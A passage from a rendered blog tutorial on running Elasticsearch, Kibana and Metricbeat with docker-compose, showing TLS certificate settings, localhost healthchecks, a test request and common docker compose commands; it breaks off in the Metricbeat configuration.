&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.http.ssl.key=certs/es01/es01.key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.http.ssl.certificate=certs/es01/es01.crt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.transport.ssl.enabled=true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.transport.ssl.key=certs/es01/es01.key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.transport.ssl.certificate=certs/es01/es01.crt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.security.transport.ssl.verification_mode=certificate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.license.self_generated.type=${LICENSE}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;mem_limit&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ES_MEM_LIMIT}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;ulimits&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;memlock&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;soft&lt;/span&gt;: -&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;hard&lt;/span&gt;: -&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;healthcheck&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;test&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CMD-SHELL&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q &amp;#39;missing authentication credentials&amp;#39;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;interval&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;retries&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is docker cluster configuration, where CA certificate and node path is specified. In this case Elasticsearch data and certifications are not stored in docker container. Instead they will be saved in local storage for data persistence and robustness.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  volumes:
     - certs:/usr/share/elasticsearch/config/certs
     - esdata01:/usr/share/elasticsearch/data&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With both these configurations set up, now I can perform &lt;code&gt;docker compose up&lt;/code&gt; command to create and run containers.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: &lt;code&gt;docker compose up&lt;/code&gt; command should be run in the folder where &lt;code&gt;docker-compose.yml&lt;/code&gt; resides.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s my example:&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205120451.png&#34; alt=&#34;SubRegisters&#34;  /&gt;
  &lt;/figure&gt;

&lt;p&gt;Here you can see that &lt;code&gt;elastic-network&lt;/code&gt; and container has successfully run.&lt;/p&gt;
&lt;p&gt;In case you need docker composer commands, here are a few useful ones:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Command&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;docker compose up&lt;/td&gt;
          &lt;td&gt;Created and starts all containers within docker-compose.yml&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;docker compose down&lt;/td&gt;
          &lt;td&gt;Stops all containers and removes any networks relating to docker-compose.yml. Leaves Volumes intact and allows generated data to persist between builds&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;docker compose down -v&lt;/td&gt;
          &lt;td&gt;Same as above and removes Volumes. basically starting over.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;docker compose start&lt;/td&gt;
          &lt;td&gt;starts existing containers&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;docker compose stop&lt;/td&gt;
          &lt;td&gt;Stops all containers. same as CTRL+C&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;copying-valid-certificates&#34;&gt;
  Copying valid certificates
  &lt;a href=&#34;#copying-valid-certificates&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Now that the system is up and running I need to make sure that valid certificates for docker container is present in my local machine.&lt;/p&gt;
&lt;p&gt;Here I copy certificate from docker machine to &lt;code&gt;/tmp/&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker cp elk-stack-es01-1:/usr/share/elasticsearch/config/certs/ca/ca.crt /tmp/.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;now let&amp;rsquo;s test it.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl --cacert /tmp/ca.crt -u elastic:elpass https://localhost:9200&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Successful response:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;json&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;es01&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cluster_name&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;docker-cluster&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cluster_uuid&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ItB3TTyJTMqX5K6McWGaCw&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;version&amp;#34;&lt;/span&gt; : {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;number&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8.7.1&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;build_flavor&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;default&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;build_type&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;docker&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;build_hash&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f229ed3f893a515d590d0f39b05f68913e2d9b53&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;build_date&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2023-04-27T04:33:42.127815583Z&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;build_snapshot&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;lucene_version&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;9.5.0&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;minimum_wire_compatibility_version&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;7.17.0&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;minimum_index_compatibility_version&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;7.0.0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tagline&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You Know, for Search&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Notice that we can access elasticsearch using &lt;code&gt;localhost:9200&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;kibana&#34;&gt;
  Kibana
  &lt;a href=&#34;#kibana&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;h4 id=&#34;docker-composeyml-1&#34;&gt;
  docker-compose.yml
  &lt;a href=&#34;#docker-composeyml-1&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Now I can add Kibana container config in &lt;code&gt;docker-compose.yml&lt;/code&gt; and specify that it should run after Elasticsearch node.&lt;/p&gt;
&lt;p&gt;Add the following to &lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;kibana&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;depends_on&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;es01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/kibana/kibana:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;co.elastic.logs/module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kibana&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/kibana/config/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;kibanadata:/usr/share/kibana/data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;${KIBANA_PORT}:5601&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;SERVERNAME=kibana&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTICSEARCH_HOSTS=https://es01:9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTICSEARCH_USERNAME=kibana_system&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTICSEARCH_PASSWORD=${KIBANA_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTICSEARCH_SSL_CERTIFICATEAUTHORITIES=config/certs/ca/ca.crt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;XPACK_SECURITY_ENCRYPTIONKEY=${ENCRYPTION_KEY}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY=${ENCRYPTION_KEY}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;XPACK_REPORTING_ENCRYPTIONKEY=${ENCRYPTION_KEY}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;mem_limit&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${KB_MEM_LIMIT}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;healthcheck&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;test&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CMD-SHELL&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl -s -I http://localhost:5601 | grep -q &amp;#39;HTTP/1.1 302 Found&amp;#39;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;interval&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;retries&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now you can either use Docker Desktop to enable Kibana container or just use terminal CTLR+C your container and rerun &lt;code&gt;docker compose up&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now, open up browser and go to &lt;code&gt;localhost:5601&lt;/code&gt; to see your elastic up and running.&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205123325.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;Awesome! Now try logging in with credentials that was specified in &lt;code&gt;.env&lt;/code&gt; file. It should log in without any problems.&lt;/p&gt;

&lt;h3 id=&#34;metricbeat&#34;&gt;
  Metricbeat
  &lt;a href=&#34;#metricbeat&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;h4 id=&#34;docker-composeyml-2&#34;&gt;
  docker-compose.yml
  &lt;a href=&#34;#docker-composeyml-2&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Now that Kibana and Elasticsearch are running and communicating, I can continue and setup Metricbeat same as Kibana before.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Add the following to &lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;metricbeat01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;depends_on&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;es01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;kibana&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/beats/metricbeat:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/metricbeat/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;metricbeatdata01:/usr/share/metricbeat/data&lt;/span&gt;
